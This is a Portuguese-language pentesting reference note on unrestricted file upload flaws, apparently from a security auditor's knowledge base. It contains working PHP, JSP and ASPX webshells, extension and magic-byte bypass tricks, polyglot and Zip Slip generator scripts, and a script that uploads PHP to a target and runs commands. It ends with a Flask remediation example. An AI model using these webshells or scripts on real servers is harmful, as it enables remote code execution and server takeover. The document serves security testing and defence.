# Unrestricted File Upload

**Tags:** #critico #alto #upload #webshell #rce #file-upload
**OWASP:** A04:2021  Insecure Design / A03:2021  Injection
**CVSS Base:** 9.8 (Crítico  webshell resulta em RCE)

---

## 📖 O que é

Endpoints de upload que não validam adequadamente o tipo e conteúdo real do arquivo permitem ao atacante fazer upload de webshells (scripts executáveis pelo servidor) ou arquivos maliciosos que detonam ao serem processados.

---

## 🔍 `grep_search` Táticas

```
SaveAs(
move_uploaded_file(
fs.writeFile(
upload.array(
upload.single(
multer(
FileField
file.save(
shutil.move(
werkzeug.utils.secure_filename
```

**Verificar obrigatoriamente:** o nome de arquivo submetido pelo usuário é confiado diretamente no filesystem path?  RCE Crítico imediato.

---

## 💣 Técnicas de Bypass

### 1. Evasão de Extensão

```
# Extensões alternativas para PHP
.php5, .phtml, .phar, .php3, .php4, .phps

# Extensões alternativas para JSP
.jspx, .jspf

# Extensões para ASP.NET
.ashx, .aspx, .cer, .asa

# Extensões para Perl
.pl, .cgi
```

### 2. Null Byte e Double Extension

```
shell.php%00.jpg        servidor trata como .php, ignora .jpg
shell.php.jpg           servidor com config permissiva processa .php
shell.jpg.php           servidor case-insensitive
shell.PHP               bypass de filtro case-sensitive
SHELL.PHP               bypass adicional
```

### 3. Magic Byte Spoofing

```php
# Inserir assinatura de GIF no início do arquivo PHP
GIF89a;
<?php system($_GET['cmd']); ?>
# mime_content_type() detecta GIF, mas Apache executa como PHP
# Salvo como evil.php.gif ou evil.gif se servidor executa GIF
```

```python
# .tmp/create_polyglot.py
magic_bytes = b"GIF89a"
php_payload = b"\n<?php system($_GET['cmd']); ?>"
with open('polyglot.php.gif', 'wb') as f:
    f.write(magic_bytes + php_payload)
print("Polyglot file criado: polyglot.php.gif")
```

### 4. MIME Type Spoofing no Request

```bash
# Enviar arquivo PHP com Content-Type de imagem
curl -X POST http://target.com/upload \
     -F "file=@shell.php;type=image/jpeg" \
     -H "Authorization: Bearer $TOKEN"
```

### 5. SVG como Vetor de XSS

```xml
<!-- evil.svg  executa JavaScript ao abrir ou renderizar -->
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">alert(document.cookie)</script>
</svg>
```

### 6. ZIP/RCE (Zip Slip)

```python
# .tmp/create_zipslip.py
import zipfile

with zipfile.ZipFile("evil.zip", "w") as zf:
    # Arquivo com path traversal no zip
    zf.write("shell.php", "../../../../var/www/html/shell.php")
    
print("ZipSlip criado: evil.zip")
# Ao ser extraído pelo servidor  shell.php em /var/www/html/ = Webshell
```

---

## 🎯 Tipos de Webshell

### PHP Webshell Mínima
```php
<?php system($_GET['cmd']); ?>
```

### PHP Webshell com Features
```php
<?php
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    if (function_exists('system')) {
        system($cmd);
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $output);
        echo implode("\n", $output);
    } elseif (function_exists('passthru')) {
        passthru($cmd);
    }
}
?>
```

### JSP Webshell
```jsp
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
  InputStream in = p.getInputStream();
  byte[] buf = new byte[in.available()];
  in.read(buf);
  out.print(new String(buf));
%>
```

### ASPX Webshell
```aspx
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe").StandardOutput.ReadToEnd()); %>
```

---

## 🧪 Script de Validação

```python
# .tmp/validate_file_upload.py
import requests, io

TARGET = "http://target.com"
UPLOAD_ENDPOINT = "/api/upload"
ACCESS_ENDPOINT = "/uploads/"

TOKEN = "Bearer eyJ..."

# 1. Tentar upload de PHP com nome direto
php_content = b"<?php echo 'WEBSHELL_TEST_' . phpversion(); system('id'); ?>"
for ext in ['php', 'php5', 'phtml', 'phar']:
    filename = f"test.{ext}"
    files = {'file': (filename, io.BytesIO(php_content), 'image/jpeg')}
    r = requests.post(f"{TARGET}{UPLOAD_ENDPOINT}", files=files, 
                      headers={"Authorization": TOKEN}, timeout=10)
    
    print(f"[{r.status_code}] Upload de {filename}: {r.text[:100]}")
    
    # Tentar acessar o arquivo para confirmar execução
    response_data = r.json() if r.headers.get('content-type', '').startswith('application/json') else {}
    file_url = response_data.get('url') or response_data.get('path') or f"{ACCESS_ENDPOINT}{filename}"
    
    access_r = requests.get(f"{TARGET}{file_url}?cmd=id", timeout=5)
    if 'uid=' in access_r.text or 'WEBSHELL_TEST_' in access_r.text:
        print(f"[🔴 RCE CRÍTICO] Webshell ativa em: {file_url}")
        print(f"Output: {access_r.text[:300]}")
```

---

## 🛡️ Correção

```python
#  Validação completa de upload  Python Flask
import magic  # python-magic
from werkzeug.utils import secure_filename
import uuid, os

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
ALLOWED_MIME_TYPES = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
UPLOAD_FOLDER = '/var/app/uploads'

def validate_and_save_upload(file):
    # 1. Verificar extensão (whitelist)
    filename = secure_filename(file.filename)
    ext = filename.rsplit('.', 1)[-1].lower() if '.' in filename else ''
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"Extensão não permitida: .{ext}")
    
    # 2. Ler conteúdo e verificar magic bytes
    content = file.read()
    file.seek(0)
    
    mime = magic.from_buffer(content, mime=True)  # verifica bytes reais
    if mime not in ALLOWED_MIME_TYPES:
        raise ValueError(f"Tipo MIME real não permitido: {mime}")
    
    # 3. Gerar nome aleatório (nunca usar nome do usuário)
    safe_name = f"{uuid.uuid4().hex}.{ext}"
    
    # 4. Salvar fora do webroot (serve via proxy, nunca expõe como executável)
    save_path = os.path.join(UPLOAD_FOLDER, safe_name)
    
    # 5. Verificar que o path final está no UPLOAD_FOLDER (anti-path-traversal)
    if not os.path.realpath(save_path).startswith(UPLOAD_FOLDER):
        raise ValueError("Path traversal detectado")
    
    with open(save_path, 'wb') as f:
        f.write(content)
    
    return safe_name
```

**Regras de ouro:**
1. **Nunca confiar no nome enviado pelo usuário**  gerar UUID aleatório
2. **Verificar magic bytes**, não apenas extensão ou Content-Type
3. **Salvar fora do webroot**  servir via endpoint controlado, não URL direta
4. **Nunca executar arquivos uploadados**  servir sempre como `Content-Disposition: attachment`
5. **Usar antivírus/scanner** para uploads públicos em produção

---

## 🔗 Chain Exploits

```
Webshell upload  RCE  Reverse shell  Comprometimento total do servidor
SVG upload  XSS para todos os usuários que visualizam a imagem
Zip Slip  Webshell extraída em webroot  RCE
Upload + Path Traversal (nome de arquivo com ..)  Sobrescrever arquivos críticos
Upload + Race Condition  Upload temporário  Execução antes da validação
Magic byte spoofing + processamento de imagem (ImageMagick)  CVE de RCE
```

---

## 📌 Referências
- [[command-injection-rce]]
- [[path-traversal-lfi]]
- [[xss-cross-site-scripting]]
- [HackTricks File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [PayloadsAllTheThings File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
